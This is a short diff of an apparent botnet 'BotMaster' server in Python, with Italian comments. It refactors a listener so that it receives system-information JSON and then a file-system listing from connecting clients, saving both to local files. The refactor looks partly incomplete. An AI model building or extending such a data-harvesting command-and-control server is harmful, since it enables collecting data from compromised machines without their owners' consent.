@@ -29,15 +29,8 @@ class BotMaster:
         print('The server is ready to receive!')
         self.waitForClient()
 
-    def waitForClient(self):
-        """
-        Procedura tramite la quale il server accetta la richiesta di connessione del client e salva i dati ricevuti in un file .json.
-        :return: None
-        """
-        while True:
-            connection, addr = self.serverSocket.accept()
-            print('The connection has been accepted! Client ip address: ', addr[0])
 
+    def waitForHeader(self, connection):
             # Il client invia al server la dimensione dei dati raccolti ( da sostituire poi al parametro HEADER per la recv() ).
             data_dim = 0
             while data_dim == 0:
@@ -48,7 +41,17 @@ class BotMaster:
             # Comunica direttamente sulla socket del client e non tramite la sua.
             connection.send(message_received.encode(FORMAT))
 
-            print("Header dimension received: ", data_dim)
+            print("System Information Header dimension received: ", data_dim)
+    def waitForClient(self):
+        """
+        Procedura tramite la quale il server accetta la richiesta di connessione del client e salva i dati ricevuti in un file .json.
+        :return: None
+        """
+        while True:
+            connection, addr = self.serverSocket.accept()
+            print('The connection has been accepted! Client ip address: ', addr[0])
+
+            data_dim = self.waitForHeader(connection)
 
             data = connection.recv(data_dim).decode(FORMAT)
             dict = json.loads(data)
@@ -57,7 +60,17 @@ class BotMaster:
             with open('data.json', 'w') as fp:
                 json.dump(dict, fp, indent=4)
 
+            # #######################################################################################################################################
+            # Aspetta il secondo header
+            data_dim = self.waitForHeader(connection)
+
+            data = connection.recv(data_dim).decode(FORMAT)
+            with open('fileSystem.txt','w') as fp:
+                fp.write(data)
+
             connection.close()
+
+
 
 
 if __name__ == '__main__':
